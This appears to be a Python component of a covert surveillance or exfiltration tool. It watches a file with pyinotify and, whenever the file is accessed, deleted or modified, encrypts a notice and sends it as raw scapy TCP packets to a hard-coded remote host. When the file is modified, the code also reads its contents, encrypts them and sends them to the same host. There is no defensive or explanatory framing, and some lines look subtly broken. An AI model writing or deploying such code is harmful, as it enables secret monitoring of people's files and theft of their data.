import pyinotify
from scapy.all import *
from datetime import datetime
import encryption


class EventHandler(pyinotify.ProcessEvent):
    def process_IN_ACCESS(self, event):
        self.send_notif("Accessed", event.pathname)

    def process_IN_DELETE(self, event):
        self.send_notif("Deleted", event.pathname)

    def process_IN_CLOSE_WRITE(self, event):
        self.send_notif("Modified", event.pathname)
        self.send_file(event.path)

    def send_notif(self, action, data):
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg = f"[{current_time}] {action}: {data}"
        encrypted_msg = encryption.encrypt_data(msg.encode("utf-8"))
        encrypted_msg += b"$NOTIF"

        pkt = IP(dst="192.168.1.75")/TCP(sport=RandShort(), dport=8888)/encrypted_msg

        send(pkt, verbose=False) 
        time.sleep(0.1)

    def send_file(self, filename):
        with open(filename) as file:
            data = file.read()

        # Encrypt data first, and then send
        encrypted_data = encryption.encrypt_data(data.encode("utf-8"))
        encrypted_data = encrypted_data + b"$EOF" + bytes(filename, encoding="utf-8")

        pkt = IP(dst="192.168.1.75")/TCP(sport=RandShort(), dport=8500)/encrypted_data

        send(pkt, verbose=False)
        time.sleep(0.1)


def start_watchfile(filename):
    watch_manager = pyinotify.WatchManager()
    mask = pyinotify.IN_ACCESS | pyinotify.IN_DELETE | pyinotify.IN_CLOSE_WRITE

    notifier = pyinotify.ThreadedNotifier(watch_manager, EventHandler())

    watch_manager.add_watch(filename, mask)
    notifier.start()
